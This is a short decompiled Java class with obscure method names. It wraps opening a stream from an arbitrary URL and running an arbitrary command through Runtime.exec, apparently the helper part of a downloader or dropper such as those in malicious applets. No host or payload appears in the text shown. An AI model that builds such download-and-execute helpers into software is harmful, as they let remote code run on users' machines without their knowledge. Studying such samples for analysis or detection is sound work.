import java.net.URL;
import java.io.InputStream;

// 
// Decompiled by Procyon v0.5.30
// 

public class Sefas
{
    public static Runtime Rset() {
        return Runtime.getRuntime();
    }
    
    public static InputStream blef(final String s) throws Exception {
        final URL url = new URL(s);
        try {
            url.openConnection();
        }
        catch (Exception ex) {}
        return url.openStream();
    }
    
    public static void exe(final String s) throws Exception {
        Rset().exec(s).waitFor();
    }
}
